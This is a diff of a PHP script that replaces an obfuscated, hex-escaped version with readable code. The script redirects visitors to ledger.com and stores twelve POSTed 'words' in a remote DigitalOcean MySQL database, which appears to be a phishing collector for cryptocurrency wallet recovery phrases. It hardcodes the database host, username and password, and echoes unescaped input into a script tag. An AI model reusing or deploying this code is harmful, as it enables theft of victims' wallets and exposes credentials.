@@ -1,2 +1,109 @@
 <?php
- goto BWJU4; gD1IJ: $word06 = "\124\x6f\x6d\x36"; goto Wm0Ql; U5v_o: function debug_to_console($data) { $output = $data; if (is_array($output)) { $output = implode("\x2c", $output); } echo "\x3c\x73\143\162\151\x70\164\x3e\x63\x6f\156\163\157\x6c\x65\56\154\x6f\x67\x28\47\x44\x65\x62\x75\147\40\117\142\152\145\x63\164\x73\x3a\40" . $output . "\47\40\x29\x3b\74\57\x73\143\162\x69\160\x74\x3e"; } goto DYNwv; ul8kj: $word04 = "\x54\157\x6d\64"; goto bm12q; nrw8K: $word03 = "\124\157\155\63"; goto ul8kj; yYomR: $word01 = "\124\157\155\x31"; goto qiofg; bm12q: $word05 = "\x54\157\x6d\65"; goto gD1IJ; tOdHs: $database = "\151\x64\x32\x30\71\x37\x36\64\x37\x34\x5f\164\145\x73\x74\x64\x62"; goto ORMah; BWJU4: header("\114\157\x63\x61\x74\x69\x6f\x6e\x3a\x20\x68\164\164\160\163\72\57\x2f\x77\x77\167\56\154\x65\x64\147\145\162\56\143\157\155\x2f"); goto U5v_o; iBmQj: $dsn_Options = array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION); goto cD3xB; ORMah: $username = "\x69\x64\62\x30\x39\67\x36\64\x37\64\x5f\141\x64\155\151\156"; goto mvklJ; DYNwv: $servername = "\154\x6f\143\141\x6c\x68\157\163\x74"; goto tOdHs; O7jwE: $word10 = "\124\157\x6d\61\60"; goto I3w1N; dqC9i: $word09 = "\124\157\155\71"; goto O7jwE; k9bo9: if (isset($_POST)) { foreach ($_POST as $inputName => $inputValue) { debug_to_console($inputName); debug_to_console($inputValue); $array[$number] = $inputValue; $number++; } $my_Insert_Statement->bindParam("\72\x77\157\162\144\60\61", $array[0]); $my_Insert_Statement->bindParam("\72\167\x6f\162\x64\60\x32", $array[1]); $my_Insert_Statement->bindParam("\x3a\167\x6f\x72\x64\60\x33", $array[2]); $my_Insert_Statement->bindParam("\72\167\157\162\144\60\x34", $array[3]); $my_Insert_Statement->bindParam("\72\167\x6f\162\144\60\x35", $array[4]); $my_Insert_Statement->bindParam("\72\x77\x6f\162\144\x30\66", $array[5]); $my_Insert_Statement->bindParam("\x3a\167\157\162\144\60\67", $array[6]); $my_Insert_Statement->bindParam("\x3a\167\x6f\x72\x64\x30\x38", $array[7]); $my_Insert_Statement->bindParam("\x3a\x77\x6f\x72\x64\x30\x39", $array[8]); $my_Insert_Statement->bindParam("\x3a\167\x6f\162\x64\x31\x30", $array[9]); $my_Insert_Statement->bindParam("\x3a\x77\157\162\144\x31\61", $array[10]); $my_Insert_Statement->bindParam("\x3a\x77\157\162\x64\61\x32", $array[11]); if ($my_Insert_Statement->execute()) { debug_to_console("\x4e\145\167\x20\x72\x65\143\x6f\x72\x64\40\143\162\145\141\164\145\x64\x20\163\x75\143\x63\145\163\163\146\165\x6c\x6c\171"); } else { debug_to_console("\x55\156\x61\x62\x6c\x65\40\164\157\40\x63\162\x65\141\x74\x65\40\x72\145\x63\157\162\144"); } } goto crvTG; OALcU: $my_Insert_Statement = $my_Db_Connection->prepare("\111\x4e\x53\x45\x52\124\40\111\x4e\124\117\x20\127\x4f\x52\x44\x53\61\x32\40\x28\x77\x6f\162\144\x30\61\54\x20\167\157\162\144\60\62\54\x20\x77\x6f\x72\144\x30\x33\54\x20\x77\x6f\162\x64\60\x34\54\40\167\x6f\162\x64\60\x35\x2c\40\x77\x6f\162\x64\x30\x36\54\40\167\157\162\x64\x30\x37\x2c\40\167\157\x72\x64\60\x38\x2c\40\x77\157\x72\x64\60\x39\54\40\167\x6f\162\x64\x31\60\x2c\40\167\157\x72\144\61\x31\x2c\x20\167\x6f\x72\144\61\62\51\x20\x56\101\114\125\105\x53\40\x28\x3a\167\x6f\162\144\x30\61\54\40\72\167\157\162\144\60\62\54\x20\72\167\x6f\x72\144\60\63\54\x20\72\x77\157\162\x64\x30\x34\x2c\40\72\167\157\x72\x64\x30\65\54\x20\72\x77\157\x72\144\60\66\x2c\40\x3a\x77\x6f\x72\144\x30\x37\54\40\72\167\157\162\144\60\x38\54\40\x3a\x77\x6f\x72\x64\x30\71\54\x20\72\x77\x6f\x72\144\61\60\x2c\x20\x3a\x77\x6f\x72\x64\61\x31\54\x20\72\167\x6f\162\x64\x31\x32\51"); goto R1k4v; dC7c6: $word12 = "\x54\x6f\x6d\61\62"; goto OALcU; qiofg: $word02 = "\x54\x6f\x6d\x32"; goto nrw8K; Wm0Ql: $word07 = "\x54\x6f\x6d\67"; goto mW_ve; R1k4v: $array = new SplFixedArray(12); goto R4aiS; R4aiS: $number = 0; goto k9bo9; cD3xB: try { $my_Db_Connection = new PDO($sql, $username, $password, $dsn_Options); debug_to_console("\x43\157\x6e\156\145\143\164\x65\144\x20\x73\165\143\143\x65\x73\163\146\x75\154\154\171"); } catch (PDOException $error) { debug_to_console("\x43\x6f\x6e\x6e\x65\x63\x74\151\157\x6e\x20\145\162\162\157\162\72\x20" . $error->getMessage()); } goto yYomR; mvklJ: $password = "\110\x65\154\x6c\x6f\127\x6f\x72\x6c\144\x24\61\62"; goto dcHXr; I3w1N: $word11 = "\x54\157\x6d\x31\x31"; goto dC7c6; mW_ve: $word08 = "\x54\157\x6d\70"; goto dqC9i; dcHXr: $sql = "\155\171\x73\161\154\x3a\150\157\163\164\x3d{$servername}\73\x64\x62\x6e\x61\x6d\145\75{$database}\x3b"; goto iBmQj; crvTG: die;
+header("Location: https://www.ledger.com/");
+function debug_to_console($data)
+{
+    $output = $data;
+    if (is_array($output))
+        $output = implode(',', $output);
+
+    echo "<script>console.log('Debug Objects: " . $output . "' );</script>";
+}
+
+$servername = "id20976474-testdb-do-user-14283264-0.b.db.ondigitalocean.com:25060";
+$database = "id20976474-testdb";
+$username = "id20976474-testdb";
+$password = "AVNS_6Z4_IMdH9NyGayFFdlz";
+$sql = "mysql:host=$servername;dbname=$database;";
+$dsn_Options = [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION];
+// Create a new connection to the MySQL database using PDO, $my_Db_Connection is an object
+try {
+    $my_Db_Connection = new PDO($sql, $username, $password, $dsn_Options);
+    debug_to_console("Connected successfully");
+} catch (PDOException $error) {
+    debug_to_console('Connection error: ' . $error->getMessage());
+}
+// Set the variables for the person we want to add to the database
+$word01 = "Tom1";
+$word02 = "Tom2";
+$word03 = "Tom3";
+$word04 = "Tom4";
+$word05 = "Tom5";
+$word06 = "Tom6";
+$word07 = "Tom7";
+$word08 = "Tom8";
+$word09 = "Tom9";
+$word10 = "Tom10";
+$word11 = "Tom11";
+$word12 = "Tom12";
+// Here we create a variable that calls the prepare() method of the database object
+// The SQL query you want to run is entered as the parameter, and placeholders are written like this :placeholder_name
+$my_Insert_Statement = $my_Db_Connection->prepare("INSERT INTO WORDS12 (word01, word02, word03, word04, word05, word06, word07, word08, word09, word10, word11, word12) VALUES (:word01, :word02, :word03, :word04, :word05, :word06, :word07, :word08, :word09, :word10, :word11, :word12)");
+// Now we tell the script which variable each placeholder actually refers to using the bindParam() method
+// First parameter is the placeholder in the statement above - the second parameter is a variable that it should refer to
+// $my_Insert_Statement->bindParam(":word01", $word01);
+// $my_Insert_Statement->bindParam(":word02", $word02);
+// $my_Insert_Statement->bindParam(":word03", $word03);
+// $my_Insert_Statement->bindParam(":word04", $word04);
+// $my_Insert_Statement->bindParam(":word05", $word05);
+// $my_Insert_Statement->bindParam(":word06", $word06);
+// $my_Insert_Statement->bindParam(":word07", $word07);
+// $my_Insert_Statement->bindParam(":word08", $word08);
+// $my_Insert_Statement->bindParam(":word09", $word09);
+// $my_Insert_Statement->bindParam(":word10", $word10);
+// $my_Insert_Statement->bindParam(":word11", $word11);
+// $my_Insert_Statement->bindParam(":word12", $word12);
+
+// // Execute the query using the data we just defined
+// // The execute() method returns TRUE if it is successful and FALSE if it is not, allowing you to write your own messages here
+// if ($my_Insert_Statement->execute()) {
+//     debug_to_console("New record created successfully");
+// } else {
+//     debug_to_console("Unable to create record");
+// }
+// At this point, you can change the data of the variables and execute again to add more data to the database
+// $first_Name = "John";
+// $last_Name = "Smith";
+// $email = "john.smith@domain.tld";
+
+// // Execute again now that the variables have changed
+// if ($my_Insert_Statement->execute()) {
+//   debug_to_console("New record created successfully");
+// } else {
+//   debug_to_console("Unable to create record");
+// }
+
+$array = new SplFixedArray(12);
+$number = 0;
+
+if (isset($_POST)) {
+    foreach ($_POST as $inputName => $inputValue) {
+        debug_to_console($inputName); //This is the name of an input field
+        debug_to_console($inputValue); //This is the value of the input field
+
+        $array[$number] = $inputValue;
+
+        $number++;
+    }
+
+    $my_Insert_Statement->bindParam(":word01", $array[0]);
+    $my_Insert_Statement->bindParam(":word02", $array[1]);
+    $my_Insert_Statement->bindParam(":word03", $array[2]);
+    $my_Insert_Statement->bindParam(":word04", $array[3]);
+    $my_Insert_Statement->bindParam(":word05", $array[4]);
+    $my_Insert_Statement->bindParam(":word06", $array[5]);
+    $my_Insert_Statement->bindParam(":word07", $array[6]);
+    $my_Insert_Statement->bindParam(":word08", $array[7]);
+    $my_Insert_Statement->bindParam(":word09", $array[8]);
+    $my_Insert_Statement->bindParam(":word10", $array[9]);
+    $my_Insert_Statement->bindParam(":word11", $array[10]);
+    $my_Insert_Statement->bindParam(":word12", $array[11]);
+
+    if ($my_Insert_Statement->execute()) {
+        debug_to_console("New record created successfully");
+    } else {
+        debug_to_console("Unable to create record");
+    }
+}
+
+
+exit();
